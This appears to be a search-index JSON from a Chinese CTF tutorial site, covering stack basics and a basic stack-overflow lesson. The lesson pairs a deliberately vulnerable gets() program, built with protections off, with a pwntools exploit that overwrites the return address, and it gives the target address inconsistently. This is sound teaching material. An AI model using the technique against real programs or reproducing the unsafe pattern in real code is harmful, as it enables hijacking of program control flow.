{
    "docs": [
        {
            "location": "/", 
            "text": "\u8bfe\u7a0b\u6a21\u677f\uff08\u4f8b\u5b50\uff09\n\n\n\u5173\u952e\u6587\u6863\n\n\n\n\nmkdocs.yml\n\n\nJenkinsfile\n\n\nDockerfile\n\n\ndocker-compose.yml\n\n\nscripts/\n\n\ndocker_build_push.sh\n\n\ndeploy.sh\uff08\u5f85\u5b8c\u5584\uff09", 
            "title": "\u7b80\u4ecb"
        }, 
        {
            "location": "/#_1", 
            "text": "", 
            "title": "\u8bfe\u7a0b\u6a21\u677f\uff08\u4f8b\u5b50\uff09"
        }, 
        {
            "location": "/#_2", 
            "text": "mkdocs.yml  Jenkinsfile  Dockerfile  docker-compose.yml  scripts/  docker_build_push.sh  deploy.sh\uff08\u5f85\u5b8c\u5584\uff09", 
            "title": "\u5173\u952e\u6587\u6863"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/", 
            "text": "\u6808\u4ecb\u7ecd\n\n\n\u57fa\u672c\u6808\u4ecb\u7ecd\n\n\n\u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa(First in Last Out)\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u662f\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u76f8\u5e94\u7684\u6808\u5e95\u3002\n\n\n\n\n\u5728\u8ba1\u7b97\u673a\u7684\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6709\u81ea\u5df1\u7684\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u540c\u6837\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0e\u4e00\u822c\u6211\u4eec\u7406\u89e3\u4e0d\u540c\u7684\u662f\uff0c\n\u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684\n\u3002\n\n\n\u51fd\u6570\u8c03\u7528\u6808\n\n\n\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002\n\n\n\n\nC\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00)\n\n\nC\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c)\n\n\n\n\n\u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32\u4f4d\u7a0b\u5e8f\u4e0e64\u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b\n\n\n\n\nx86\n\n\n\u51fd\u6570\u53c2\u6570\n\u5728\n\u51fd\u6570\u8fd4\u56de\u5730\u5740\n\u7684\u4e0a\u65b9\n\n\nx64\n\n\nx64\u4e2d\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728\nRDI, RSI, RDX, RCX, R8\u548c R9\u5bc4\u5b58\u5668\n\u91cc\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002\n\n\n\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007FFFFFFFFFFF\uff0c\n6\u4e2a\u5b57\u8282\u957f\u5ea6\n\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\ncsapp", 
            "title": "\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_1", 
            "text": "", 
            "title": "\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_2", 
            "text": "\u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa(First in Last Out)\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u662f\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u76f8\u5e94\u7684\u6808\u5e95\u3002   \u5728\u8ba1\u7b97\u673a\u7684\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6709\u81ea\u5df1\u7684\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u540c\u6837\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0e\u4e00\u822c\u6211\u4eec\u7406\u89e3\u4e0d\u540c\u7684\u662f\uff0c \u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684 \u3002", 
            "title": "\u57fa\u672c\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_3", 
            "text": "\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002   C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00)  C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c)   \u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32\u4f4d\u7a0b\u5e8f\u4e0e64\u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b   x86  \u51fd\u6570\u53c2\u6570 \u5728 \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u7684\u4e0a\u65b9  x64  x64\u4e2d\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728 RDI, RSI, RDX, RCX, R8\u548c R9\u5bc4\u5b58\u5668 \u91cc\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002  \u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007FFFFFFFFFFF\uff0c 6\u4e2a\u5b57\u8282\u957f\u5ea6 \uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002   \u53c2\u8003\u9605\u8bfb   csapp", 
            "title": "\u51fd\u6570\u8c03\u7528\u6808"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/", 
            "text": "\u6808\u6ea2\u51fa\u539f\u7406\n\n\n\u4ecb\u7ecd\n\n\n\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u6808\u4e2d\u4e0e\u5176\u76f8\u90bb\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e(\u6bd4\u5982\u8bf4\uff0c\u8fd8\u6709\u5411\u5806\u4e2d\u5199\uff0c\u5411bss\u6bb5\u5199)\u3002\u800c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\uff0c\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f\n\n\n\n\n\u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002\n\n\n\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002\n\n\n\n\n\u57fa\u672c\u793a\u4f8b\n\n\n\u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c\n\u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u7684\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\n\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a\n\n\n##include \nstdio.h\n\n\n##include \nstring.h\n\n\nvoid\n \nsuccess\n()\n \n{\n \nputs\n(\nYou Hava already controlled it.\n);\n \n}\n\n\nvoid\n \nvulnerable\n()\n \n{\n\n  \nchar\n \ns\n[\n12\n];\n\n  \ngets\n(\ns\n);\n\n  \nputs\n(\ns\n);\n\n  \nreturn\n;\n\n\n}\n\n\nint\n \nmain\n(\nint\n \nargc\n,\n \nchar\n \n**\nargv\n)\n \n{\n\n  \nvulnerable\n();\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\n\u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884csuccess\u51fd\u6570\u3002\n\n\n\u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u9f50\u8fdb\u884c\u7f16\u8bd1\n\n\n\u279c  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example\nstack_example.c: In \nfunction\n \u2018vulnerable\u2019:\nstack_example.c:6:3: warning: implicit declaration of \nfunction\n \u2018gets\u2019 \n[\n-Wimplicit-function-declaration\n]\n\n   gets\n(\ns\n)\n;\n\n   ^\n/tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a\nstack_example.c:\n(\n.text+0x27\n)\n: \u8b66\u544a\uff1a the \n`\ngets\n \nfunction\n is dangerous and should not be used.\n\n\n\n\n\u53ef\u4ee5\u770b\u51fagets\u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u800c\u5b83\u56e0\u4e3a\u5176\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u662f\u5426\u8f93\u5165\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c\n\n\n\n\n\u5386\u53f2\u4e0a\uff0c\n\u83ab\u91cc\u65af\u8815\u866b\n\u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86gets\u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\n\n\n\n\n\u6b64\u5916\uff0c\n-m32\n \u6307\u7684\u662f\u751f\u621032\u4f4d\u7a0b\u5e8f\uff1b \n-fno-stack-protector\n \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210canary\u3002\u6b64\u5916\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fASLR\u4fdd\u62a4\u3002\u8fd9\u662f\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u5229\u7528IDA\u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770bvulnerable\u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230\n\n\nint\n \nvulnerable\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [sp+4h] [bp-14h]@1\n\n\n  \ngets\n(\ns\n);\n\n  \nreturn\n \nputs\n(\ns\n);\n\n\n}\n\n\n\n\n\n\u8be5\u5b57\u7b26\u4e32\u8ddd\u79bbebp\u7684\u957f\u5ea6\u4e3a0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a\n\n\n                                           +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp---\n+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14--\n+-----------------+\n\n\n\n\n\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDA\u83b7\u5f97success\u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a0x0804846B\u3002\n\n\n.text:\n0804843\nB\n \nsuccess\n         \nproc\n \nnear\n\n\n.text:\n0804843\nB\n                 \npush\n    \nebp\n\n\n.text:\n0804843\nC\n                 \nmov\n     \nebp\n,\n \nesp\n\n\n.text:\n0804843\nE\n                 \nsub\n     \nesp\n,\n \n8\n\n\n.text:\n08048441\n                 \nsub\n     \nesp\n,\n \n0\nCh\n\n\n.text:\n08048444\n                 \npush\n    \noffset\n \ns\n        \n; \nYou Hava already controlled it.\n\n\n.text\n:\n08048449\n                 \ncall\n    \n_puts\n\n\n.text:\n0804844\nE\n                 \nadd\n     \nesp\n,\n \n10\nh\n\n\n.text:\n08048451\n                 \nnop\n\n\n.text:\n08048452\n                 \nleave\n\n\n.text:\n08048453\n                 \nretn\n\n\n.text:\n08048453\n \nsuccess\n         \nendp\n\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a\n\n\n0x14*\na\n+\nbbbb\n+success_addr\n\n\n\n\n\u90a3\u4e48\uff0c\u7531\u4e8egets\u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06saved ebp\u8986\u76d6\u4e3abbbb\uff0c\u5c06retaddr\u8986\u76d6\u4e3asuccess_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a\n\n\n                                           +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp---\n+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14--\n+-----------------+\n\n\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u5bf9\u5e94\u7684\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B\u7684\u5b58\u50a8\u662f\u5982\u4e0b\u7ed3\u6784\n\n\n\\x3b\\x84\\x04\\x08\n\n\n\n\n\u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06\\x3b\u4e4b\u7c7b\u7684\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2pwntools\u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884cgithub)\uff0c\u8fd9\u91cc\u5229\u7528pwntools\u7684\u4ee3\u7801\u5982\u4e0b\uff1a\n\n\n##coding=utf8\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61\n\n\nsh\n \n=\n \nprocess\n(\n./stack_example\n)\n\n\nsuccess_addr\n \n=\n \n0x0804843b\n\n\n## \u6784\u9020payload\n\n\npayload\n \n=\n \na\n \n*\n \n0x14\n \n+\n \nbbbb\n \n+\n \np32\n(\nsuccess_addr\n)\n\n\nprint\n \np32\n(\nsuccess_addr\n)\n\n\n## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230\n\n\n\u279c  stack-example python exp.py\n\n[\n+\n]\n Starting \nlocal\n process \n./stack_example\n: pid \n61936\n\n\n;\n\\x\n84\n\\x\n0\n\n\n[\n*\n]\n Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb\n;\n\\x\n84\n\\x\n0\n\nYou Hava already controlled it.\n\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n$ \n\n[\n*\n]\n Process \n./stack_example\n stopped with \nexit\n code -11 \n(\nSIGSEGV\n)\n \n(\npid \n61936\n)\n\n\n[\n*\n]\n Got EOF \nwhile\n sending in interactive\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884csuccess\u51fd\u6570\u3002\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u5bfb\u627e\u5371\u9669\u51fd\u6570\n\n\n\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\n\n\n\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\n\n\ngets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00'\n\n\nscanf\n\n\nvscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\nsprintf\n\n\n\n\n\n\n\u5b57\u7b26\u4e32\n\n\nstrcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62\n\n\nstrcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62\n\n\nbcopy\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u586b\u5145\u957f\u5ea6\n\n\n\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97\n\u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb\n\u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f\n\n\n\n\n\u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15\n\n\n\u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\n\n\n\u76f4\u63a5\u5730\u5740\u7d22\u5f15\n\n\n\n\n\u5176\u4e2d\u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97\uff1b\u76f8\u5bf9\u4e8e\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u95ee\u9898\u3002\u901a\u8fc7\u7edd\u5bf9\u5730\u5740\u7d22\u5f15\u7684\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42\n\n\n\n\n\u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740\n\uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770bEBP\u5373\u53ef\u3002\n\n\n\u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\n\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002\n\n\n\u8986\u76d6bss\u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\n\u3002\n\n\n\u7b49\u7b49\n\n\n\n\n\u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\nstack buffer overflow\n\n\nhttp://bobao.360.cn/learning/detail/3694.html", 
            "title": "\u6808\u6ea2\u51fa\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_1", 
            "text": "", 
            "title": "\u6808\u6ea2\u51fa\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_2", 
            "text": "\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u6808\u4e2d\u4e0e\u5176\u76f8\u90bb\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e(\u6bd4\u5982\u8bf4\uff0c\u8fd8\u6709\u5411\u5806\u4e2d\u5199\uff0c\u5411bss\u6bb5\u5199)\u3002\u800c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\uff0c\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f   \u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002  \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_3", 
            "text": "\u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c \u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u7684\u4ee3\u7801\u53ef\u4ee5\u6267\u884c \u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a  ##include  stdio.h  ##include  string.h  void   success ()   {   puts ( You Hava already controlled it. );   }  void   vulnerable ()   { \n   char   s [ 12 ]; \n   gets ( s ); \n   puts ( s ); \n   return ;  }  int   main ( int   argc ,   char   ** argv )   { \n   vulnerable (); \n   return   0 ;  }   